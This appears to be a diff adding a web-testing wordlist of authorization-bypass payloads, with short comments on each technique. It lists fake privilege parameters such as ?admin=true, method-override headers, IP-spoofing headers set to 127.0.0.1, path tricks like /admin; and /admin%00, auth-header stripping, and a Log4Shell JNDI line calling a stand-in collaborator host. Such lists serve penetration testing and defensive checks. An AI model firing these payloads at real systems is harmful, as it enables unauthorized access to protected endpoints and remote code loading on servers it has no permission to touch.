@@ -1,0 +1,46 @@
+# Fake-parameter cache/auth confusion — /api/public?anything=/api/private
+# When public endpoint accepts arbitrary query params, sometimes routes to authenticated backend
+?admin=true
+?bypass=1
+?debug=true
+?debug=1
+?authenticated=true
+?is_admin=1
+?role=admin
+?superuser=true
+?internal=1
+?test=1
+# HTTP-method override headers — WAF often only inspects the outer verb
+X-HTTP-Method-Override: PUT
+X-HTTP-Method: DELETE
+X-Method-Override: PATCH
+# Client-IP spoof headers — hits the "trusted internal" allow path
+X-Custom-IP-Authorization: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Real-IP: 127.0.0.1
+X-Originating-IP: 127.0.0.1
+X-Remote-IP: 127.0.0.1
+X-Remote-Addr: 127.0.0.1
+X-Client-IP: 127.0.0.1
+X-Host: localhost
+X-Forwarded-Host: localhost
+# Path-based bypass — trailing slash, encoded traversal, case, extension
+/admin
+/admin/
+/admin/.
+/admin;
+/admin/../admin
+/ADMIN
+/admin.json
+/admin?.json
+/admin%00
+/admin%20
+/admin/./
+/./admin
+# Auth-header stripping
+Authorization:
+Cookie: session=
+# Nesting / URL-in-URL
+/api/public/latest?anything=/api/public
+/api/public/latest?anything=/api/private
+/api/public/${jndi:ldap://BURP_COLLAB}
